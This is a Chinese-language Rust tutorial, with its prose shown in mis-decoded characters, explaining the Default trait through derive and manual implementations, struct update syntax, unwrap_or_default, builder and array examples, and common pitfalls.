<p><code>Default</code> trait å°±æ˜¯æ¥æ•‘ä½ çš„ã€‚å®ƒè®©ç±»å‹æä¾›ä¸€ä¸ªã€Œåˆç†çš„é»˜è®¤å€¼ã€ï¼Œä¸€è¡Œä»£ç æå®šåˆå§‹åŒ–ï¼Œæƒ³æ”¹å“ªä¸ªå­—æ®µå°±æ”¹å“ªä¸ªã€‚</p>
<p>é…ç½®å¯¹è±¡ã€Builder æ¨¡å¼ã€Option å…œåº•å€¼â€¦â€¦Default çš„ç”¨å¤„æ¯”ä½ æƒ³çš„å¤šå¾—å¤šã€‚</p>
<h2 data-id="heading-0">å¿«é€Ÿä¸Šæ‰‹</h2>
<p><strong>30 ç§’çœ‹æ‡‚ Default</strong>ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 1. æ´¾ç”Ÿ Default</span>
<span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    host: <span class="hljs-type">String</span>,
    port: <span class="hljs-type">u16</span>,
}

<span class="hljs-comment">// 2. ç”¨ ..Default::default() åªæ”¹éœ€è¦çš„å­—æ®µ</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">config</span> = Config {
    port: <span class="hljs-number">8080</span>,
    ..<span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>()  <span class="hljs-comment">// host è‡ªåŠ¨å¡« ""</span>
};

<span class="hljs-comment">// 3. Option å…œåº•å€¼</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">port</span> = <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-number">8080</span>).<span class="hljs-title function_ invoke__">unwrap_or_default</span>();  <span class="hljs-comment">// 8080</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">port</span> = <span class="hljs-literal">None</span>.<span class="hljs-title function_ invoke__">unwrap_or_default</span>();        <span class="hljs-comment">// 0</span>
</code></pre>
<p><strong>ä½¿ç”¨æµç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[éœ€è¦é»˜è®¤å€¼?] --&gt;|æ˜¯| B{æ‰€æœ‰å­—æ®µéƒ½æœ‰ Default?}
    A --&gt;|å¦| Z[ä¸å®ç° Default]
    
    B --&gt;|æ˜¯| C{é»˜è®¤å€¼åˆç†?}
    B --&gt;|å¦| D[æ‰‹åŠ¨å®ç° Default]
    
    C --&gt;|æ˜¯| E[#derive Default]
    C --&gt;|å¦| D
    
    E --&gt; F[ä½¿ç”¨ ..Default::default]
    D --&gt; F
    
    style E fill:#90EE90
    style D fill:#FFD700
    style Z fill:#FFB6C1
</code></pre>
<p><strong>ä¸‰ç§å®ç°æ–¹å¼</strong>ï¼š</p>

























<table><thead><tr><th>æ–¹å¼</th><th>é€‚ç”¨åœºæ™¯</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>æ´¾ç”Ÿ</td><td>æ‰€æœ‰å­—æ®µéƒ½æœ‰ Defaultï¼Œé»˜è®¤å€¼åˆç†</td><td><code>#[derive(Default)]</code></td></tr><tr><td>æ‰‹åŠ¨å®ç°</td><td>éœ€è¦è‡ªå®šä¹‰é»˜è®¤å€¼</td><td><code>impl Default for T { ... }</code></td></tr><tr><td>æ ‡å‡†åº“</td><td>åŸºæœ¬ç±»å‹ç›´æ¥ç”¨</td><td><code>i32::default()</code> â†’ 0</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-1">ä¸€çœ¼çœ‹æ‡‚ Default</h2>
<p>å…ˆçœ‹ä¸ªç—›è‹¦çš„åœºæ™¯ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// åˆ›å»ºé…ç½®å¯¹è±¡ï¼Œ20 ä¸ªå­—æ®µå…¨å¾—å†™</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">config</span> = Config {
    host: <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>(),
    port: <span class="hljs-number">0</span>,
    timeout: <span class="hljs-number">0</span>,
    retries: <span class="hljs-number">0</span>,
    debug: <span class="hljs-literal">false</span>,
    <span class="hljs-comment">// ... è¿˜æœ‰ 15 ä¸ªå­—æ®µ</span>
};
<span class="hljs-comment">// å…¶å®æˆ‘åªæƒ³æ”¹è¿™ä¸¤ä¸ª</span>
config.host = <span class="hljs-string">"localhost"</span>.<span class="hljs-title function_ invoke__">to_string</span>();
config.port = <span class="hljs-number">8080</span>;
</code></pre>
<p>æœ‰äº† <code>Default</code>ï¼Œä¸–ç•Œæ¸…å‡€äº†ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">config</span> = Config::<span class="hljs-title function_ invoke__">default</span>();  <span class="hljs-comment">// å…¶ä»–å­—æ®µè‡ªåŠ¨å¡«é»˜è®¤å€¼</span>
config.host = <span class="hljs-string">"localhost"</span>.<span class="hljs-title function_ invoke__">to_string</span>();
config.port = <span class="hljs-number">8080</span>;
</code></pre>
<h3 data-id="heading-2">trait å®šä¹‰ï¼šå°±ä¸€ä¸ªæ–¹æ³•</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">trait</span> <span class="hljs-title class_">Default</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span>;
}
</code></pre>
<p>å°±ä¸€ä¸ªæ–¹æ³•ï¼Œè¿”å›ç±»å‹çš„é»˜è®¤å®ä¾‹ã€‚ç®€å•ç²—æš´ã€‚</p>
<h2 data-id="heading-3">ä¸‰ç§ç”¨æ³•ï¼šæ´¾ç”Ÿã€æ‰‹åŠ¨ã€æ ‡å‡†åº“</h2>
<h3 data-id="heading-4">æ ‡å‡†åº“å·²ç»å¸®ä½ å®ç°å¥½äº†</h3>
<p>Rust æ ‡å‡†åº“å·²ç»å¸®ä½ å®ç°å¥½äº†å¸¸è§ç±»å‹çš„ <code>Default</code>ï¼š</p>













































<table><thead><tr><th>ç±»å‹</th><th>é»˜è®¤å€¼</th><th>è®°å¿†æŠ€å·§</th></tr></thead><tbody><tr><td>æ•°å€¼ç±»å‹</td><td><code>0</code></td><td>æ•°å­¦é‡Œçš„é›¶å…ƒç´ </td></tr><tr><td><code>bool</code></td><td><code>false</code></td><td>æœ€ä¿å®ˆçš„é€‰æ‹©</td></tr><tr><td><code>char</code></td><td><code>'\0'</code></td><td>ç©ºå­—ç¬¦</td></tr><tr><td><code>String</code></td><td><code>""</code></td><td>ç©ºå­—ç¬¦ä¸²</td></tr><tr><td><code>Vec&lt;T&gt;</code></td><td><code>[]</code></td><td>ç©ºå‘é‡</td></tr><tr><td><code>Option&lt;T&gt;</code></td><td><code>None</code></td><td>å•¥éƒ½æ²¡æœ‰</td></tr><tr><td><code>Box&lt;T&gt;</code></td><td><code>Box::new(T::default())</code></td><td>é€’å½’è°ƒç”¨</td></tr></tbody></table>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">n</span>: <span class="hljs-type">i32</span> = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();        <span class="hljs-comment">// 0</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();     <span class="hljs-comment">// ""</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();   <span class="hljs-comment">// []</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">b</span>: <span class="hljs-type">bool</span> = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();       <span class="hljs-comment">// false</span>
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}, {}, {:?}, {}"</span>, n, s, v, b);
}
</code></pre>
<h3 data-id="heading-5">æ´¾ç”Ÿï¼šè®©ç¼–è¯‘å™¨å¸®ä½ å†™</h3>
<p>æ‰€æœ‰å­—æ®µéƒ½å®ç°äº† <code>Default</code>ï¼Ÿç›´æ¥ <code>#[derive(Default)]</code>ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    host: <span class="hljs-type">String</span>,      <span class="hljs-comment">// ""</span>
    port: <span class="hljs-type">u16</span>,         <span class="hljs-comment">// 0</span>
    timeout: <span class="hljs-type">u64</span>,      <span class="hljs-comment">// 0</span>
    debug: <span class="hljs-type">bool</span>,       <span class="hljs-comment">// false</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">config</span> = Config::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}:{}"</span>, config.host, config.port);  <span class="hljs-comment">// :0</span>
}
</code></pre>
<p>ç¼–è¯‘å™¨å¸®ä½ ç”Ÿæˆçš„ä»£ç ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Config</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Config {
            host: <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>(),
            port: <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>(),
            timeout: <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>(),
            debug: <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>(),
        }
    }
}
</code></pre>
<h3 data-id="heading-6">æ‰‹åŠ¨å®ç°ï¼šè‡ªå®šä¹‰æ›´åˆç†çš„é»˜è®¤å€¼</h3>
<p>æ´¾ç”Ÿçš„é»˜è®¤å€¼å¤ªå‚»ï¼Ÿè‡ªå·±å†™ä¸€ä¸ªï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ServerConfig</span> {
    host: <span class="hljs-type">String</span>,
    port: <span class="hljs-type">u16</span>,
    max_connections: <span class="hljs-type">usize</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">ServerConfig</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        ServerConfig {
            host: <span class="hljs-string">"localhost"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),  <span class="hljs-comment">// ä¸æ˜¯ç©ºå­—ç¬¦ä¸²</span>
            port: <span class="hljs-number">8080</span>,                      <span class="hljs-comment">// ä¸æ˜¯ 0</span>
            max_connections: <span class="hljs-number">100</span>,            <span class="hljs-comment">// åˆç†çš„ä¸šåŠ¡é»˜è®¤å€¼</span>
        }
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">config</span> = ServerConfig::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æœåŠ¡å™¨: {}:{}"</span>, config.host, config.port);  <span class="hljs-comment">// localhost:8080</span>
}
</code></pre>
<h2 data-id="heading-7">Default çš„ 5 ä¸ªå®æˆ˜åœºæ™¯</h2>
<h3 data-id="heading-8">åœºæ™¯ 1ï¼šç»“æ„ä½“æ›´æ–°è¯­æ³•ï¼ˆæœ€å¸¸ç”¨ï¼‰</h3>
<p><strong>ç—›ç‚¹</strong>ï¼šåˆ›å»ºç»“æ„ä½“æ—¶ï¼Œå¤§éƒ¨åˆ†å­—æ®µç”¨é»˜è®¤å€¼ï¼Œåªæƒ³æ”¹å‡ ä¸ªã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šç”¨ <code>..Default::default()</code> è¯­æ³•ï¼Œåªå†™ä½ å…³å¿ƒçš„å­—æ®µã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">User</span> {
    name: <span class="hljs-type">String</span>,
    age: <span class="hljs-type">u32</span>,
    email: <span class="hljs-type">String</span>,
    active: <span class="hljs-type">bool</span>,
    role: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// åªè®¾ç½®éœ€è¦çš„å­—æ®µï¼Œå…¶ä»–ç”¨é»˜è®¤å€¼</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">user</span> = User {
        name: <span class="hljs-string">"å¼ ä¸‰"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        email: <span class="hljs-string">"zhangsan@example.com"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        ..<span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>()  <span class="hljs-comment">// age=0, active=false, role=""</span>
    };
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}, {}, {}"</span>, user.name, user.age, user.active);
    <span class="hljs-comment">// å¼ ä¸‰, 0, false</span>
}
</code></pre>
<p><strong>é…ç½®å¯¹è±¡æ›´çˆ½</strong>ï¼š20 ä¸ªå­—æ®µåªæ”¹ 2 ä¸ªï¼Œçœäº† 18 è¡Œä»£ç ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">HttpClient</span> {
    timeout: <span class="hljs-type">u64</span>,
    retries: <span class="hljs-type">u32</span>,
    user_agent: <span class="hljs-type">String</span>,
    follow_redirects: <span class="hljs-type">bool</span>,
    <span class="hljs-comment">// ... è¿˜æœ‰å¾ˆå¤šå­—æ®µ</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">client</span> = HttpClient {
        timeout: <span class="hljs-number">30</span>,
        retries: <span class="hljs-number">3</span>,
        ..<span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>()  <span class="hljs-comment">// å…¶ä»–å­—æ®µéƒ½æ˜¯é»˜è®¤å€¼</span>
    };
}
</code></pre>
<h3 data-id="heading-9">åœºæ™¯ 2ï¼šOption å…œåº•å€¼</h3>
<p><strong>ç—›ç‚¹</strong>ï¼š<code>Option</code> æ˜¯ <code>None</code> æ—¶ï¼Œéœ€è¦ä¸€ä¸ªå…œåº•å€¼ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š<code>unwrap_or_default()</code> ä¸€è¡Œæå®šã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_port</span>(config: <span class="hljs-type">Option</span>&lt;<span class="hljs-type">u16</span>&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u16</span> {
    config.<span class="hljs-title function_ invoke__">unwrap_or_default</span>()  <span class="hljs-comment">// None æ—¶è¿”å› 0</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, <span class="hljs-title function_ invoke__">get_port</span>(<span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-number">8080</span>)));  <span class="hljs-comment">// 8080</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, <span class="hljs-title function_ invoke__">get_port</span>(<span class="hljs-literal">None</span>));        <span class="hljs-comment">// 0</span>
}
</code></pre>
<p><strong>å®æˆ˜ä¾‹å­</strong>ï¼šHashMap æŸ¥ä¸åˆ°æ—¶è¿”å›é»˜è®¤å€¼ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::collections::HashMap;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">scores</span> = HashMap::<span class="hljs-title function_ invoke__">new</span>();
    scores.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">95</span>);
    
    <span class="hljs-comment">// Bob ä¸å­˜åœ¨ï¼Œè¿”å›é»˜è®¤å€¼ 0</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">bob_score</span> = scores.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">"Bob"</span>).<span class="hljs-title function_ invoke__">copied</span>().<span class="hljs-title function_ invoke__">unwrap_or_default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Bob çš„åˆ†æ•°: {}"</span>, bob_score);  <span class="hljs-comment">// 0</span>
}
</code></pre>
<h3 data-id="heading-10">åœºæ™¯ 3ï¼šæ³›å‹å‡½æ•°</h3>
<p><strong>ç”¨é€”</strong>ï¼šå†™é€šç”¨å‡½æ•°æ—¶ï¼Œè®©è°ƒç”¨è€…å†³å®šé»˜è®¤å€¼æ˜¯ä»€ä¹ˆã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">create_or_default</span>&lt;T: <span class="hljs-built_in">Default</span>&gt;(value: <span class="hljs-type">Option</span>&lt;T&gt;) <span class="hljs-punctuation">-&gt;</span> T {
    value.<span class="hljs-title function_ invoke__">unwrap_or_default</span>()
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-title function_ invoke__">create_or_default</span>(<span class="hljs-literal">None</span>);      <span class="hljs-comment">// ""</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; = <span class="hljs-title function_ invoke__">create_or_default</span>(<span class="hljs-literal">None</span>);    <span class="hljs-comment">// []</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">n</span>: <span class="hljs-type">i32</span> = <span class="hljs-title function_ invoke__">create_or_default</span>(<span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-number">42</span>));     <span class="hljs-comment">// 42</span>
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}, {:?}, {}"</span>, s, v, n);  <span class="hljs-comment">// , [], 42</span>
}
</code></pre>
<h3 data-id="heading-11">åœºæ™¯ 4ï¼šBuilder æ¨¡å¼</h3>
<p><strong>ç”¨é€”</strong>ï¼šBuilder ä»é»˜è®¤å€¼å¼€å§‹ï¼Œé“¾å¼è°ƒç”¨ä¿®æ”¹éœ€è¦çš„å­—æ®µã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">QueryBuilder</span> {
    table: <span class="hljs-type">String</span>,
    limit: <span class="hljs-type">usize</span>,
    offset: <span class="hljs-type">usize</span>,
    order_by: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">QueryBuilder</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span>::<span class="hljs-title function_ invoke__">default</span>()  <span class="hljs-comment">// ä»é»˜è®¤å€¼å¼€å§‹</span>
    }
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">table</span>(<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, table: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">self</span>.table = table.<span class="hljs-title function_ invoke__">to_string</span>();
        <span class="hljs-keyword">self</span>
    }
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">limit</span>(<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, limit: <span class="hljs-type">usize</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">self</span>.limit = limit;
        <span class="hljs-keyword">self</span>
    }
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">build</span>(<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> {
        <span class="hljs-built_in">format!</span>(<span class="hljs-string">"SELECT * FROM {} LIMIT {}"</span>, <span class="hljs-keyword">self</span>.table, <span class="hljs-keyword">self</span>.limit)
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">query</span> = QueryBuilder::<span class="hljs-title function_ invoke__">new</span>()
        .<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">"users"</span>)
        .<span class="hljs-title function_ invoke__">limit</span>(<span class="hljs-number">10</span>)
        .<span class="hljs-title function_ invoke__">build</span>();
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, query);  <span class="hljs-comment">// SELECT * FROM users LIMIT 10</span>
}
</code></pre>
<h3 data-id="heading-12">åœºæ™¯ 5ï¼šæ‰¹é‡åˆå§‹åŒ–æ•°ç»„</h3>
<p><strong>ç”¨é€”</strong>ï¼šåˆ›å»ºå›ºå®šå¤§å°çš„æ•°ç»„ï¼Œæ‰€æœ‰å…ƒç´ éƒ½æ˜¯é»˜è®¤å€¼ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 5 ä¸ªç©ºå­—ç¬¦ä¸²</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">array</span>: [<span class="hljs-type">String</span>; <span class="hljs-number">5</span>] = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{:?}"</span>, array);  <span class="hljs-comment">// ["", "", "", "", ""]</span>
    
    <span class="hljs-comment">// 10 ä¸ªè®¡æ•°å™¨ï¼Œåˆå§‹å€¼éƒ½æ˜¯ 0</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">counters</span>: [<span class="hljs-type">i32</span>; <span class="hljs-number">10</span>] = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{:?}"</span>, counters);  <span class="hljs-comment">// [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span>
}
</code></pre>
<h2 data-id="heading-13">4 ä¸ªå¸¸è§å‘</h2>
<h3 data-id="heading-14">å‘ 1ï¼šé»˜è®¤å€¼ä¸ä¸€å®šåˆç†</h3>
<p><strong>é—®é¢˜</strong>ï¼šæ´¾ç”Ÿçš„é»˜è®¤å€¼å¯èƒ½åœ¨ä¸šåŠ¡ä¸Šæ²¡æ„ä¹‰ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Rectangle</span> {
    width: <span class="hljs-type">u32</span>,   <span class="hljs-comment">// é»˜è®¤ 0</span>
    height: <span class="hljs-type">u32</span>,  <span class="hljs-comment">// é»˜è®¤ 0</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">area</span>(rect: &amp;Rectangle) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u32</span> {
    rect.width * rect.height
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">rect</span> = Rectangle::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"é¢ç§¯: {}"</span>, <span class="hljs-title function_ invoke__">area</span>(&amp;rect));  <span class="hljs-comment">// 0ï¼Œä¸€ä¸ªé¢ç§¯ä¸º 0 çš„çŸ©å½¢ï¼Ÿ</span>
}
</code></pre>
<p><strong>æ€ä¹ˆåŠ</strong>ï¼š</p>
<p>æ–¹æ¡ˆ 1ï¼šæ‰‹åŠ¨å®ç°åˆç†çš„é»˜è®¤å€¼</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Rectangle</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Rectangle { width: <span class="hljs-number">1</span>, height: <span class="hljs-number">1</span> }  <span class="hljs-comment">// è‡³å°‘æ˜¯ä¸ªæ­£æ–¹å½¢</span>
    }
}
</code></pre>
<p>æ–¹æ¡ˆ 2ï¼šåˆ«å®ç° Defaultï¼Œå¼ºåˆ¶ç”¨æ„é€ å‡½æ•°</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Rectangle</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(width: <span class="hljs-type">u32</span>, height: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Rectangle { width, height }
    }
}
</code></pre>
<h3 data-id="heading-15">å‘ 2ï¼šæœ‰äº›å­—æ®µæ²¡æœ‰ Default</h3>
<p><strong>é—®é¢˜</strong>ï¼šç»“æ„ä½“é‡Œæœ‰ä¸ªå­—æ®µæ²¡å®ç° Defaultï¼Œæ´¾ç”Ÿå°±ä¼šæŠ¥é”™ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">User</span> {
    id: <span class="hljs-type">u64</span>,
    name: <span class="hljs-type">String</span>,
    created_at: std::time::SystemTime,  <span class="hljs-comment">// SystemTime æ²¡æœ‰ Defaultï¼</span>
}

<span class="hljs-comment">// ç¼–è¯‘é”™è¯¯ï¼</span>
<span class="hljs-comment">// #[derive(Default)]</span>
</code></pre>
<p><strong>æ€ä¹ˆåŠ</strong>ï¼šæ‰‹åŠ¨å®ç°ï¼Œç»™é‚£ä¸ªå­—æ®µä¸€ä¸ªåˆç†çš„é»˜è®¤å€¼ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        User {
            id: <span class="hljs-number">0</span>,
            name: <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>(),
            created_at: std::time::SystemTime::<span class="hljs-title function_ invoke__">now</span>(),  <span class="hljs-comment">// ç”¨å½“å‰æ—¶é—´</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-16">å‘ 3ï¼šDefault å’Œ new åˆ«ææ··</h3>
<p><strong>é—®é¢˜</strong>ï¼šä¸€ä¸ªç±»å‹åŒæ—¶æœ‰ <code>new()</code> å’Œ <code>default()</code>ï¼Œå®¹æ˜“ææ··ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    value: <span class="hljs-type">i32</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Config</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(value: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Config { value }
    }
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Config</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Config { value: <span class="hljs-number">42</span> }
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">c1</span> = Config::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">10</span>);      <span class="hljs-comment">// value = 10</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">c2</span> = Config::<span class="hljs-title function_ invoke__">default</span>();    <span class="hljs-comment">// value = 42</span>
    <span class="hljs-comment">// ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸¤ä¸ªä¸åŒçš„å€¼ï¼Œå®¹æ˜“ææ··</span>
}
</code></pre>
